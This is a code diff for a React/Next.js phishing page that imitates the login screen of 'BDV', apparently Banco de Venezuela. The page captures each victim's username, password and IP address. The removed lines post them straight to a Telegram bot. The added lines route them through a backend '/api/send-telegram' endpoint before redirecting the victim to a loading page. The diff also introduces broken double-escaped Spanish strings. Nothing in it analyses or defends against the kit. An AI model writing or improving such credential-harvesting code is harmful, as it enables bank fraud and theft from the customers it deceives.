@@ -3,7 +3,7 @@
 import { ChangeEvent, FormEvent, useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
 import { useSecurityGuards } from "@/hooks/useSecurityGuards";
-import { requestTelegramConfig, resolveIp, TelegramConfig } from "@/lib/remote";
+import { requestTelegramConfig, resolveBackendEndpoint, resolveIp } from "@/lib/remote";
 
 export default function Home() {
   useSecurityGuards();
@@ -15,27 +15,17 @@ export default function Home() {
   const [isPasswordValid, setIsPasswordValid] = useState(false);
   const [isSending, setIsSending] = useState(false);
   const [overlayError, setOverlayError] = useState<string | null>(null);
-  const [telegramConfig, setTelegramConfig] = useState<TelegramConfig | null>(null);
 
   useEffect(() => {
-    let active = true;
-
     const loadConfig = async () => {
       try {
-        const config = await requestTelegramConfig();
-        if (active) {
-          setTelegramConfig(config);
-        }
+        await requestTelegramConfig();
       } catch (error) {
         console.error(error);
       }
     };
 
     loadConfig();
-
-    return () => {
-      active = false;
-    };
   }, []);
 
   useEffect(() => {
@@ -69,37 +59,32 @@ export default function Home() {
     setIsSending(true);
 
     try {
-      const config = telegramConfig ?? (await requestTelegramConfig());
-      setTelegramConfig(config);
-
       const ip = await resolveIp();
       if (typeof window !== "undefined") {
         localStorage.setItem("usuario", username);
       }
 
-      const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+      const endpoint = resolveBackendEndpoint("/api/send-telegram");
+      const response = await fetch(endpoint, {
         method: "POST",
+        credentials: "include",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({
-          chat_id: config.chatId,
-          text: `
-BDV
-Nombre: ${username}
-Contra: ${password}
-IP: ${ip}`,
-        }),
+        body: JSON.stringify({ username, password, ip }),
       });
 
       if (!response.ok) {
-        throw new Error("Error al enviar a Telegram");
+        const payload = await response.json().catch(() => null);
+        const message = payload?.error ?? "No se pudo enviar la informacion. Intenta nuevamente.";
+        throw new Error(message);
       }
 
       router.push("/cargando");
     } catch (error) {
       console.error(error);
-      setOverlayError("No se pudo enviar la informaci\u00F3n. Intenta nuevamente.");
+      const message = error instanceof Error ? error.message : "No se pudo enviar la informacion. Intenta nuevamente.";
+      setOverlayError(message);
     } finally {
       setIsSending(false);
     }
@@ -110,7 +95,7 @@ IP: ${ip}`,
       <div className="overlay" style={{ display: showOverlay ? "flex" : "none" }}>
         <div className="content">
           <form onSubmit={handleOverlaySubmit}>
-            <h4 style={{ color: "#0067b1", marginBottom: "10px" }}>{"Introduce tu contrase\u00F1a"}</h4>
+            <h4 style={{ color: "#0067b1", marginBottom: "10px" }}>{"Introduce tu contrase\\u00F1a"}</h4>
             <div className="form-group2">
               <input
                 id="contra"
@@ -121,7 +106,7 @@ IP: ${ip}`,
                 placeholder=" "
                 required
               />
-              <label htmlFor="contra">{"Contrase\u00F1a"}</label>
+              <label htmlFor="contra">{"Contrase\\u00F1a"}</label>
             </div>
 
             {overlayError && (
@@ -197,8 +182,8 @@ IP: ${ip}`,
                 marginBottom: "30px",
               }}
             >
-              {"\u00BFOlvidaste tu usuario o clave?"} <br />
-              {"Si eres nuevo clienteBDV reg\u00EDstrate aqu\u00ED"}
+              {"\\u00BFOlvidaste tu usuario o clave?"} <br />
+              {"Si eres nuevo clienteBDV reg\\u00EDstrate aquí"}
             </div>
           </form>
         </div>
@@ -207,3 +192,7 @@ IP: ${ip}`,
     </>
   );
 }
+
+
+
+
